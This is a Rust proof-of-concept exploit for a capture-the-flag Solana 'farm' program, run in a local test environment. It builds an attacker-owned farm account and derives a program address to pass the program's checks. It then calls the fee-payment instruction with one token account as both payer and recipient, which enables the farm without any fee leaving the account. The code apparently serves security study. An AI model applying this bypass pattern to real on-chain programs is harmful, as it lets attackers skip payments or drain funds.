use std::{env, str::FromStr};
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction, };

use owo_colors::OwoColorize;

use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program, borsh::try_from_slice_unchecked, program_pack::Pack};

use spl_token::{
    state::Account as TokenAccount
};


use borsh::BorshSerialize;
use ctf_solana_farm::{state::Farm, constant::FARM_FEE, instruction::ix_pay_create_fee};


pub fn main() {

   //SETUP
   let farm_program = Pubkey::from_str("F4RM333333333333333333333333333333333333333").unwrap();
   let creator = keypair(0);
   
   let user_usdc_token_account = keypair(2);
   let fee_owner = keypair(12);
   let mint_authority = keypair(3);
   let mint_address = keypair(4).pubkey();
   

   //Create a farm who's owner is the signer of the pay farm fee instruction to bypass security check
   let farm = keypair(173);
   let new_farm = Farm {
    is_allowed: 0,
    nonce: 7,
    pool_lp_token_account: keypair(5).pubkey(),
    pool_reward_token_account: keypair(6).pubkey(),
    pool_mint_address: keypair(7).pubkey(),
    reward_mint_address: keypair(8).pubkey(),
    token_program_id: spl_token::ID,
    owner: creator.pubkey(),
    fee_owner: fee_owner.pubkey(),

    reward_per_share_net: 100,
    last_timestamp: 100,
    reward_per_timestamp: 100,
    start_timestamp: 100,
    end_timestamp: 100
    };
    let mut new_farm_data: Vec<u8> = vec![];
    new_farm.serialize(&mut new_farm_data).unwrap();

    //generate a PDA to pass security check
    let authority_address = get_authority_address(&farm_program, &farm.pubkey(), new_farm.nonce);

   //getting the path to our program
   let mut dir = env::current_exe().unwrap();
   let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("ctf_solana_farm.so");
        dir.to_str()
    }
    .unwrap();

   let amount_1sol = sol_to_lamports(1.0);

   //building out our local testing environment 
   let mut env = LocalEnvironment::builder()
   .add_program(farm_program, path)
   .add_account_with_lamports(creator.pubkey(), system_program::ID, amount_1sol)
   .add_account_with_data(farm.pubkey(),farm_program, &new_farm_data, false)
   .add_token_mint(mint_address, Some(mint_authority.pubkey()) , 1_000_000, 9, None)
   .add_account_with_tokens(user_usdc_token_account.pubkey(),mint_address, creator.pubkey(), FARM_FEE)
   .add_account_with_tokens(fee_owner.pubkey(), mint_address, farm.pubkey(), 0)
   .build();

   let user_usdc_token_account_info = env.get_account(user_usdc_token_account.pubkey()).unwrap();
   let initial_user_usdc_account_info = TokenAccount::unpack_from_slice(&user_usdc_token_account_info.data).unwrap();

   println!(" Initial User USDC Token Account Balance: {}", initial_user_usdc_account_info.amount);



   /*creating our pay farm fee instruction, note that the user_usdc_token_account and fee_owner account 
   have to be the same token account owned by the user_transfer authority for the self token transfer to work
   */
   let pay_farm_fee_instruction = ix_pay_create_fee(
       &farm.pubkey(),
       &authority_address,
       &creator.pubkey(),
       &creator.pubkey(),
       &user_usdc_token_account.pubkey(),
       &user_usdc_token_account.pubkey(),
       &spl_token::ID,
       &farm_program,
       FARM_FEE
   );


   //call on the pay farm fee function
   env.execute_as_transaction_debug(
       &[pay_farm_fee_instruction],
       &[&creator],
   )
   .print();


   //vertify that the creators token balance remains the same and that the farm is now enabled 
   let user_usdc_token_account_info = env.get_account(user_usdc_token_account.pubkey()).unwrap();
   let final_user_usdc_account_info = TokenAccount::unpack_from_slice(&user_usdc_token_account_info.data).unwrap();

   let farm_account = env.get_account(farm.pubkey()).unwrap();
   let final_farm_data = try_from_slice_unchecked::<Farm>(&farm_account.data).unwrap();

   println!("Final User USDC Token Account Balance: {}", final_user_usdc_account_info.amount);

   if initial_user_usdc_account_info.amount == final_user_usdc_account_info.amount && final_farm_data.is_allowed == 1 {
        println!("[*] {}", "Creator was able to bypass paying the farm fee.".green());
   } else {
        println!("[*] {}", "Creator was not successful in bypassing the farm fee.".red());
   }
}


pub fn get_authority_address(program_id: &Pubkey, my_info: &Pubkey, nonce: u8) -> Pubkey {
    Pubkey::create_program_address(&[&my_info.to_bytes()[..32], &[nonce]], &program_id).unwrap()
}
